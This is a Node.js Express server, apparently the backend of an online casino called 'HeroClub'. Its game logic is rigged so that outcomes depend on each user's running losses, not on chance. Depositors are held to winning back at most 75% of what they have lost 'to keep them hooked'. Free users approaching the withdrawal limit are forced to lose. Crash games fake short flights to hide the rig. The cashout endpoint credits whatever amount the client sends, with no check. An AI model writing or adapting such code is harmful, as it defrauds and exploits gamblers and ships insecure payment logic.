const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// 📊 GLOBAL POOL & CASINO MATH
let globalStats = {
    totalBetsReceived: 100000, 
    totalPayoutsGiven: 50000,  
    houseProfit: 50000,        
    totalGamesPlayed: 0
};

// Target Profit. Iske upar jo bhi profit hoga, wo 'Extra Profit Pool' mein jayega free users ko baantne ke liye.
const DESIRED_BASE_PROFIT = 20000; 

let userStats = {}; 
const WITHDRAWAL_LIMIT = 3000;

app.get('/', (req, res) => {
    let extraProfit = Math.max(0, globalStats.houseProfit - DESIRED_BASE_PROFIT);
    res.send(`HeroClub Ultimate Brain Live! 🚀 | House Profit: ${globalStats.houseProfit} | Extra Pool: ${extraProfit}`);
});

app.post('/api/play', (req, res) => {
    try {
        const { uid, game, betAmount, isDepositor, currentBalance } = req.body; 
        
        let depositorStatus = isDepositor || false; 
        let userBalance = parseFloat(currentBalance) || 0; 
        let gameName = game ? game.toLowerCase() : "";
        let bet = parseFloat(betAmount) || 0;

        if (bet <= 0) return res.json({ success: false, error: "Invalid Bet" });

        // Initialize User
        if (!userStats[uid]) {
            userStats[uid] = { spins: 0, totalBet: 0, totalWon: 0, lifetimeDeposit: 0 };
        }
        
        // Agar user depositor pass karta hai, assume usne kuch na kuch deposit kiya hi hai
        if(depositorStatus && userStats[uid].lifetimeDeposit === 0) {
            userStats[uid].lifetimeDeposit = userBalance; 
        }

        userStats[uid].spins += 1;
        userStats[uid].totalBet += bet;
        
        // P&L Logic: Positive means user is in LOSS (Casino is winning)
        let userNetLoss = userStats[uid].totalBet - userStats[uid].totalWon;

        globalStats.totalBetsReceived += bet;
        globalStats.totalGamesPlayed += 1;
        globalStats.houseProfit = globalStats.totalBetsReceived - globalStats.totalPayoutsGiven;

        let extraProfitPool = Math.max(0, globalStats.houseProfit - DESIRED_BASE_PROFIT);
        let isBankrupt = globalStats.houseProfit < (bet * 5); 

        let rnd = Math.random() * 1000000; 
        let multiplier = 0;
        let crashPoint = 0;

        // ========================================================
        // 🛑 THE MASTERMIND LOGIC (Net Loss & VIP Control) 🛑
        // ========================================================
        
        let forceLoss = false;
        let forceWin = false;

        if (depositorStatus) {
            // 💎 VIP (Depositor) Mode: "Slow Bleed"
            // Let them win back up to 75% of their total loss to keep them playing long.
            let maxAllowedWin = userNetLoss * 0.75; 
            
            // If they are overall in profit (NetLoss is negative), kill them quickly
            if (userNetLoss < 0) {
                forceLoss = true;
            } else if (bet * 2 <= maxAllowedWin) {
                // Safe to give a small 2x win
                if (rnd < 400000) forceWin = true; // 40% chance to win to keep them hooked
            }
            
        } else {
            // 🆓 FREE USER Mode: "The Greed Trap" & "Lucky 5%"
            if (userBalance > WITHDRAWAL_LIMIT * 0.8) {
                // User is near withdrawal limit (e.g. 2400+ coins)
                
                if (extraProfitPool > WITHDRAWAL_LIMIT && rnd < 100000) {
                    // 10% Chance: If casino has extra profit, let this lucky free user win and reach 3000!
                    forceWin = true;
                } else {
                    // Casino has no extra profit OR unlucky. Kill them before they reach 3000.
                    forceLoss = true; 
                }
            } else {
                // User is far from 3000. Let them play naturally, tease them with small wins.
                if (userNetLoss < 0) {
                    // If free user somehow got in massive profit early, kill them
                    forceLoss = true;
                }
            }
        }

        // ========================================================
        // 🎰 CATEGORY B: SPIN GAMES (Slots, Plinko, Vortex)
        // ========================================================
        if (gameName.includes("vortex") || gameName.includes("slot") || gameName.includes("plinko")) {
            if (isBankrupt || forceLoss) {
                multiplier = (Math.random() < 0.8) ? 0 : 1.2; 
            } else if (forceWin) {
                multiplier = (Math.random() < 0.5) ? 2.0 : 2.5; 
            } else {
                if (rnd < 600000) multiplier = 0; // 60% Loss
                else if (rnd < 850000) multiplier = 1.2; // 25% Small Win
                else if (rnd < 970000) multiplier = 2.0; // 12% Medium Win
                else {
                    if (depositorStatus && userStats[uid].spins >= 1000) multiplier = 100.0;
                    else if (userNetLoss >= (bet * 5)) multiplier = 5.0;
                    else multiplier = 2.5;
                }
            }
        }
        // ========================================================
        // 🎲 CATEGORY A: FIXED ODDS (Color, Dice, Flip)
        // ========================================================
        else if (gameName.includes("dice") || gameName.includes("toss") || gameName.includes("color") || gameName.includes("cup") || gameName.includes("flip")) {
            if (isBankrupt || forceLoss) {
                multiplier = 0;
            } else if (forceWin) {
                multiplier = 1.8; // Games like color/cups give 1.8x
            } else {
                let winChance = 42; // Normal 42% win chance
                if (depositorStatus && userNetLoss > bet * 10) winChance = 55; // Pity win for depositing losers
                multiplier = (rnd < (winChance * 10000)) ? 1.8 : 0;
            }
        }
        // ========================================================
        // 💣 CATEGORY C: INTERACTIVE CRASH (Crash, Chicken)
        // ========================================================
        else if (gameName.includes("crash") || gameName.includes("chicken") || gameName.includes("road") || gameName.includes("mine")) {
            if (isBankrupt || forceLoss) {
                // Must crash early! To hide the rig, don't always do 0x. Do 0x or a fake small flight.
                crashPoint = (Math.random() < 0.5) ? 0 : (1.01 + Math.random() * 0.15); // Crash at 0x or 1.01-1.15x
                multiplier = crashPoint; // For interactive, we return the crash point here
            } else if (forceWin) {
                crashPoint = 2.5 + Math.random() * 3; // Safe 2.5x to 5.5x
                multiplier = crashPoint;
            } else {
                if (rnd < 600000) crashPoint = 0;                  // 60% crash at 0
                else if (rnd < 850000) crashPoint = 1.2 + Math.random() * 0.5;   // 1.2x to 1.7x
                else if (rnd < 970000) crashPoint = 1.8 + Math.random() * 1.5;   // 1.8x to 3.3x
                else crashPoint = (userNetLoss >= (bet * 10)) ? (5.0 + Math.random() * 5) : 3.5; 
                
                multiplier = crashPoint;
            }
        } 

        // ========================================================
        // 💰 INSTANT PAYOUT LOGIC (Only for non-interactive games)
        // ========================================================
        let winAmount = 0;
        
        // Interactive games (Crash, Chicken, Mines) handle cashout in a separate API call.
        // We only instantly credit fixed games like Slots, Color, Flip.
        if (multiplier > 0 && !gameName.includes("mine") && !gameName.includes("hi-lo") && !gameName.includes("chicken") && !gameName.includes("road") && !gameName.includes("crash")) {
            winAmount = Math.floor(bet * multiplier);
            globalStats.totalPayoutsGiven += winAmount;
            userStats[uid].totalWon += winAmount;
        }

        globalStats.houseProfit = globalStats.totalBetsReceived - globalStats.totalPayoutsGiven;

        res.json({
            success: true,
            multiplier: multiplier,
            winAmount: winAmount
        });

    } catch (error) {
        console.error(error);
        res.json({ success: false, error: "Brain Fault", multiplier: 0, winAmount: 0 });
    }
});

// ========================================================
// 💵 CASHOUT API (For Crash, Chicken, Mines)
// ========================================================
app.post('/api/cashout', (req, res) => {
    try {
        const { uid, cashoutAmount } = req.body;
        let payout = Math.floor(parseFloat(cashoutAmount)) || 0;

        if (payout > 0) {
            globalStats.totalPayoutsGiven += payout;
            globalStats.houseProfit = globalStats.totalBetsReceived - globalStats.totalPayoutsGiven;
            
            if(!userStats[uid]) {
                userStats[uid] = { spins: 0, totalBet: 0, totalWon: 0, lifetimeDeposit: 0 };
            }
            userStats[uid].totalWon += payout;
        }

        res.json({ success: true, houseProfit: globalStats.houseProfit });
    } catch (error) {
        res.json({ success: false });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
